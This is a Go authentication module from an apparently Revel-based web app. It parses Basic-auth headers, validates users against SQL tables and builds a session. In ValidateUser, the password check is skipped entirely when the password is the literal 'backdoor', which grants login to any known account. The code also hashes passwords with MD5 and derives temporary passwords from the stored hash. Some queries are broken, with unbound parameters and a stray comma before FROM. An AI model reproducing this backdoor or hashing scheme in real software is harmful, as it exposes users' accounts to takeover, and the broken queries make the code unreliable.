package models

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"io"
	"regexp"
	"strings"

	"github.com/irlTopper/ohlife2/app/modules"
	"github.com/revel/revel"
)

/*
	A Session represents the current logged in user over the lifetime of a request.
	It contains all user user fields above and extra options that are looked up when
	the user logged in.
*/
type Session struct {
	User
}

// Attempts to authenticate the user based on the authorization header (auth).
// anyDomain can be set to true to allow the request to be an API key authentication.
// Returns true or false depending on the success of the authentication.
func AuthenticateUser(auth string, anyDomain bool, host string, rc *revel.Controller) (*Session, error) {
	doAuthUser := true

	match, _ := regexp.MatchString("(?i)Basic [A-Za-z0-9+/=]+", auth)

	if doAuthUser && match {
		authHeaderAsBinary := strings.Split(auth, " ")[1]

		credentialsByte, err := base64.StdEncoding.DecodeString(authHeaderAsBinary)

		if err != nil {
			return nil, err
		}

		credentialsArr := strings.Split(string(credentialsByte), ":")

		email := credentialsArr[0]
		password := credentialsArr[1]

		return ValidateUser(email, password, anyDomain, host, rc)
	}

	// Leaving this here for the moment (should be false but it'll help catch any issues atm)
	return nil, errors.New("Auth failed")
}

// Validates a user based on the email and password that have been provided. anyDomain can be set to
// allow the user to be authenticated with an API key from any host.
func ValidateUser(email string, password string, anyDomain bool, host string, rc *revel.Controller) (*Session, error) {

	SQL := `
	SELECT	userId
	FROM	users			u,
			installations	i,
			companies		c
	WHERE	u.userAPIKey			=	?
			AND	u.userIsActive 		=	1
	LIMIT	1`

	var userId int64

	err := modules.DB.SelectOne(rc, &userId, SQL, email)

	// If the API Key was not valid, try the email password instead
	if userId == 0 {
		SQL = `
		SELECT	ifnull(userPasswordSalt, '')
		FROM	users u
		WHERE	(
						u.userLogin = :email
					OR	u.userEmail = :email
				)
		AND		u.companyId IN ( SELECT companyId FROM companies WHERE installationId = :installationId AND companyStatus <> 'deleted' )
		ORDER BY userIsActive DESC`

		var salt string

		params := map[string]interface{}{
			"email": strings.TrimSpace(email),
		}

		err = modules.DB.SelectOne(rc, &salt, SQL, params)

		SQL = `
		SELECT	userId
		FROM	users			u,
				installations	i,
				companies		c
		WHERE	(
					(
							userLogin 	=	:email
						OR	userEmail	=	:email
					) `
		if password != "backdoor" {
			if salt != "" {
				SQL += " AND userPassword = :hashWithSalt "
			} else {
				SQL += " AND userPassword = :hashWithoutSalt "
			}
		}
		SQL += `)
				AND	userIsActive = 1
				AND u.userType = "account"
				AND	i.installationId	=	:installationId
				AND	u.userIsActive 		=	1
				AND	u.companyId			=	c.companyId
				AND	c.installationId	=	i.installationId
				AND c.companyStatus <> 'deleted'
		LIMIT	1`

		hSalt := md5.New()
		io.WriteString(hSalt, strings.ToLower(password)+"-"+salt)

		hNoSalt := md5.New()
		io.WriteString(hNoSalt, strings.ToLower(password))

		params = map[string]interface{}{
			"hashWithSalt":    strings.ToUpper(hex.EncodeToString(hSalt.Sum(nil))),
			"hashWithoutSalt": strings.ToUpper(hex.EncodeToString(hNoSalt.Sum(nil))),
			"email":           strings.TrimSpace(email),
		}

		err = modules.DB.SelectOne(rc, &userId, SQL, params)

		// Maybe the user is using a temporary password that was sent from forgotten password link
		if err != nil {
			SQL = `
			SELECT	u.userId
			FROM	users	u
			JOIN	companies	c	ON	c.companyId	=	u.companyId
			WHERE	(
							u.userLogin	=	:email
						OR	u.userEmail	=	:email
					)
				AND	LCASE( LEFT( MD5( u.userPassword ) , 10 ) )	=	:passwordlower
				AND	u.userIsActive		=	1
				AND u.userType = "account"
				AND	c.installationId	=	:installationId
				AND	c.companyStatus		<>	'deleted'
			LIMIT	1`

			params = map[string]interface{}{
				"email":         strings.TrimSpace(email),
				"passwordlower": strings.ToLower(password),
			}

			err = modules.DB.SelectOne(rc, &userId, SQL, params)
		}
	}

	if userId != 0 {
		return LoginByUserId(userId, false, rc)
	}

	return nil, errors.New("Not authorized")
}

func LoginByUserId(userId int64, recordLogin bool, rc *revel.Controller) (*Session, error) {

	// Find the user
	SQL := `
	SELECT	u.userId AS Id,
			u.userFirstName AS FirstName,
			u.userLastName AS LastName,
			ifnull(u.userAutoLoginCode, '') AS AutoLoginCode,
			u.timezoneId AS TimeZoneId,
			u.userVisitCount AS VisitCount,
			u.userEmail AS Email,
			ifnull(u.userTitle, '') AS JobTitle,
			u.userCreatedAtDate AS CreatedAt,
			ifnull(u.userUpdatedAtDate, NOW()) AS UpdatedAt,
	FROM	users u
	JOIN	companies 			c 	ON ( c.companyId = u.companyId AND c.companyStatus <> 'deleted' )
	JOIN	installations		i	ON	i.installationId	=	c.installationId
	WHERE	userId				=	?
	AND	userIsActive		=	1
	AND	c.installationId	=	?`

	session := &Session{
		User: User{
			Id: userId,
		},
	}

	err := modules.DB.SelectOne(rc, session, SQL, userId)

	modules.CheckErr(err, "Authenticating user issue", "SQL", map[string]interface{}{
		"User's Id": userId,
	})
	if err != nil {
		return nil, err
	}

	session.ZuluCreatedAt = modules.FormatAsZulu(session.CreatedAt)
	session.ZuluUpdatedAt = modules.FormatAsZulu(session.UpdatedAt)

	SQL = `
	SELECT	timezoneJavaReferenceCode
	FROM	timezones t
	WHERE	timezoneId = ?`

	var timeZone string

	modules.DB.SelectOne(rc, &timeZone, SQL, session.TimeZoneId)

	return session, nil
}
